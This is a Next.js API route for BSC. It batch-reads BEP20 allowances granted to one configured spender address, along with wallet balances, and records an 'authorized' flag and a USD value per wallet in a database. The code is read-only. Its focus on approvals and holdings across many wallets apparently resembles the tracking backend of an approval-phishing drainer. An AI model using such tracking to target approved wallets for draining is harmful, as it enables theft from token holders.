import { NextRequest, NextResponse } from 'next/server'
import { createPublicClient, http } from 'viem'
import { bsc } from 'viem/chains'
import { supabase } from '@/lib/supabase'
import { BEP20_ABI, SPENDER_ADDRESS } from '@/lib/contracts'

// 创建 BSC 公共客户端（使用主网）
const publicClient = createPublicClient({
  chain: bsc,
  transport: http()
})

interface TokenToCheck {
  wallet_address: string
  token_address: string
  decimals: number
  usd_price: number
}

// 格式化余额
function formatBalance(balance: bigint, decimals: number): string {
  if (balance === 0n) return '0'
  
  const divisor = BigInt(10 ** decimals)
  const integerPart = balance / divisor
  const fractionalPart = balance % divisor
  
  // 转换为小数字符串
  const fractionalStr = fractionalPart.toString().padStart(decimals, '0')
  const formatted = `${integerPart}.${fractionalStr}`
  
  // 移除尾部的0
  return parseFloat(formatted).toString()
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { tokens } = body as { tokens: TokenToCheck[] }

    // 验证输入
    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json(
        { success: false, error: '无效的代币列表' },
        { status: 400 }
      )
    }

    if (!SPENDER_ADDRESS) {
      return NextResponse.json(
        { success: false, error: 'Spender 地址未配置' },
        { status: 500 }
      )
    }

    console.log(`开始刷新 ${tokens.length} 条记录的授权状态和余额`)

    // 准备 multicall 合约调用（每个代币查询2个值：allowance + balance）
    const contracts = tokens.flatMap(token => [
      // 查询授权额度
      {
        address: token.token_address as `0x${string}`,
        abi: BEP20_ABI,
        functionName: 'allowance' as const,
        args: [
          token.wallet_address as `0x${string}`,
          SPENDER_ADDRESS as `0x${string}`
        ]
      },
      // 查询余额
      {
        address: token.token_address as `0x${string}`,
        abi: BEP20_ABI,
        functionName: 'balanceOf' as const,
        args: [token.wallet_address as `0x${string}`]
      }
    ])

    console.log(`准备执行 Multicall: ${contracts.length} 个查询 (${tokens.length} 条记录 × 2)`)

    // 使用 multicall 批量查询链上数据
    const results = await publicClient.multicall({
      contracts,
      allowFailure: true
    })

    console.log('Multicall 查询完成，处理结果...')

    // 处理查询结果（成对处理）
    const updates: Array<{
      wallet_address: string
      token_address: string
      authorized: boolean
      balance: string
      balance_formatted: string
      usd_value: number
    }> = []

    let successCount = 0
    let failedCount = 0

    for (let i = 0; i < tokens.length; i++) {
      const token = tokens[i]
      const allowanceResult = results[i * 2]      // 授权额度结果
      const balanceResult = results[i * 2 + 1]    // 余额结果
      
      // 检查两个查询是否都成功
      if (allowanceResult.status === 'success' && balanceResult.status === 'success') {
        const allowance = allowanceResult.result as bigint
        const balance = balanceResult.result as bigint
        const isAuthorized = allowance > 0n
        
        // 格式化余额
        const balanceFormatted = formatBalance(balance, token.decimals)
        
        // 重新计算 USD 价值
        const usdValue = parseFloat(balanceFormatted) * token.usd_price
        
        updates.push({
          wallet_address: token.wallet_address.toLowerCase(),
          token_address: token.token_address.toLowerCase(),
          authorized: isAuthorized,
          balance: balance.toString(),
          balance_formatted: balanceFormatted,
          usd_value: usdValue
        })
        
        successCount++
        console.log(
          `✓ ${token.token_address}: ` +
          `allowance=${allowance.toString()}, ` +
          `balance=${balanceFormatted}, ` +
          `usd_value=$${usdValue.toFixed(2)}, ` +
          `authorized=${isAuthorized}`
        )
      } else {
        // 至少有一个查询失败
        failedCount++
        const allowanceError = allowanceResult.status === 'failure' ? allowanceResult.error?.message : null
        const balanceError = balanceResult.status === 'failure' ? balanceResult.error?.message : null
        console.error(
          `✗ ${token.token_address}: 查询失败 - ` +
          `allowance: ${allowanceError || 'OK'}, ` +
          `balance: ${balanceError || 'OK'}`
        )
      }
    }

    // 批量更新数据库
    if (updates.length > 0) {
      console.log(`准备更新 ${updates.length} 条记录到数据库...`)
      
      // 使用逐条更新，同时更新授权状态、余额和 USD 价值
      const updatePromises = updates.map(update =>
        supabase
          .from('wallet_tokens')
          .update({
            authorized: update.authorized,
            balance: update.balance,
            balance_formatted: update.balance_formatted,
            usd_value: update.usd_value
          })
          .eq('wallet_address', update.wallet_address)
          .eq('token_address', update.token_address)
      )

      const updateResults = await Promise.allSettled(updatePromises)
      
      const dbSuccessCount = updateResults.filter(r => r.status === 'fulfilled').length
      const dbFailedCount = updateResults.filter(r => r.status === 'rejected').length

      console.log(`数据库更新完成: 成功 ${dbSuccessCount}, 失败 ${dbFailedCount}`)

      return NextResponse.json({
        success: true,
        data: {
          total: tokens.length,
          chainQuerySuccess: successCount,
          chainQueryFailed: failedCount,
          dbUpdateSuccess: dbSuccessCount,
          dbUpdateFailed: dbFailedCount,
          updates
        }
      })
    } else {
      return NextResponse.json({
        success: false,
        error: '所有链上查询都失败了',
        data: {
          total: tokens.length,
          chainQuerySuccess: 0,
          chainQueryFailed: failedCount
        }
      })
    }

  } catch (error) {
    console.error('刷新数据失败:', error)
    return NextResponse.json(
      {
        success: false,
        error: '刷新数据失败',
        details: error instanceof Error ? error.message : String(error)
      },
      { status: 500 }
    )
  }
}
